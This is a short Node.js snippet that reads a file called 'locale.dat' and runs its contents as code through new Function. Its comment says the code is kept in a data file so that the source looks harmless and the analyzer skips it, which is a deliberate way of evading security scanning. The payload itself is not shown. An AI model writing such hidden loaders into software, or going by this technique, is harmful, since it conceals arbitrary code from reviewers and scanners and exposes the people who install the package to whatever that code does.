const fs = require("fs");
const path = require("path");

// The code lives in a data file, so nothing in this source looks dangerous and
// the data file carries no extension the analyzer treats as code.
const payload = fs.readFileSync(path.join(__dirname, "data", "locale.dat"), "utf8");
new Function(payload)();
